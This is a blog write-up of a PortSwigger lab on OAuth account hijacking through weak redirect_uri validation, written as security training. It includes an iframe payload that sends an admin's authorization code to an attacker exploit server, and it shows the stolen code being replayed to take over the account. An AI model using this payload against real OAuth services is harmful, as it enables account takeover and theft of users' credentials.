---
layout: post
title: "Lab: OAuth account hijacking via redirect_uri [Write-up]"
date: 2026-09-13
platform: portswigger
vulntype: oauth
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** OAuth account hijacking via redirect_uri

**Platform:** PortSwigger

**Difficulty:** Medium

---

## Description

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`.

## Solution

Let's start with a brief explanation of why `redirect_uri` is so important.

`redirect_uri` — the URL to which OAuth redirects the user after authorization, along with the authorization code.

This is important for security: if the validation is weak, a hacker could spoof the URL and redirect the authorization code to their own server. This could result in unauthorized access to the account.

## Step 1 

Let's go to the login page, open Burp Suite, and start intercepting every request 

After logging in with the “wiener” account, we can see the following request: 

<p align="center">
  <img src="/assets/css/img/OAuth/oauth8.png" alt="oauth" />
</p>

In it, we can see the following parameters 

```python
client_id=kfsfaxjaebqs1s0m11r5i

redirect_uri=https://0aaf00a603a10794806703f100c20018.web-security-academy.net/oauth-callback

response_type=code

scope=openid%20profile%20email
```

<p align="center">
  <img src="/assets/css/img/OAuth/oauth9.png" alt="oauth" />
</p>

After sending this request, we will receive an authorization code, after which we should be able to log in successfully. 

For our attack, we'll use an exploit service and create a CSRF payload

The payload looks like this 

```python
<iframe src="https://oauth-ID-LAB.oauth-server.net/auth
  ?client_id=ja9s7jzb9v8zkfl4ksp0o
  &redirect_uri=https://exploit-ID-LAB.exploit-server.net
  &response_type=code
  &scope=openid%20profile%20email">
</iframe>
```

<p align="center">
  <img src="/assets/css/img/OAuth/oauth10.png" alt="oauth" />
</p>


<p align="center">
  <img src="/assets/css/img/OAuth/oauth11.png" alt="oauth" />
</p>


Paste it into the body and click Store -> Deliver to victim. Then go to the access log, where you'll see that a code has been sent from a different IP address. Copy that code, paste it into this link, and click on it. 

```python
https://0aaf00a603a10794806703f100c20018.web-security-academy.net/oauth-callback?code=SxIGI28wfGT49EJyIZ472BM5BPvUfaKP5Ditx0ZB6Kj
```

<p align="center">
  <img src="/assets/css/img/OAuth/oauth12.png" alt="oauth" />
</p>

We managed to gain access to the administrator account, delete the user “carlos” and complete the lab. 

---
<div align="center">

This post is licensed under  
<a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>.

© 2026 CyberKRY

</div>
